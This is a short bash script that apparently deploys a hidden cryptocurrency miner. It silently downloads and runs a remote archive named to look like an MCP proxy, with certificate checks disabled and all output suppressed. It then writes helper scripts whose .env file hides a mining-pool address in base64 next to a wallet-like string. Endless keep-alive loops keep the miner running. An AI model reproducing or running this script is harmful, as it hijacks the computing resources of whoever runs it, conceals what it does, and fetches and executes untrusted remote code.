#!/bin/bash

curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/mcpo.tar.gz >/dev/null 2>&1 
tar -xvf mcpo.tar.gz >/dev/null 2>&1
rm mcpo.tar.gz
sleep 30
echo '#!/bin/bash

cd mcp && chmod +x run.sh && nproc --all && ./run.sh 4 worker06 >/dev/null 2>&1
sleep 30
while true
do
        echo "Ngopi Boss..."
        sleep 1800
done' > bos.sh
cd mcp && echo '#!/bin/bash

PORT=$1
NAME=$2
if [ ! -d "python" ]; then
  echo "Python folder not found → downloading..."
  curl -O -J -L https://github.com/indygreg/python-build-standalone/releases/download/20240107/cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
  tar -xf cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
  rm -f cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
else
  echo "Python already exists → skip download"
fi
export PATH=./python/bin:$PATH
yes |  pip install certifi
export SSL_CERT_FILE=$(python -m certifi)
echo "SERVER_WS=ws://datacenter.dichoiseptoa.site
SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
SERVER_DOMAIN=88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL
SERVER_SECRET=$NAME
SERVER_CONNECTION=$PORT
SERVER_MODE=FAST" > .env
while true; do
  python3 app.py
  sleep 15
done' > run.sh
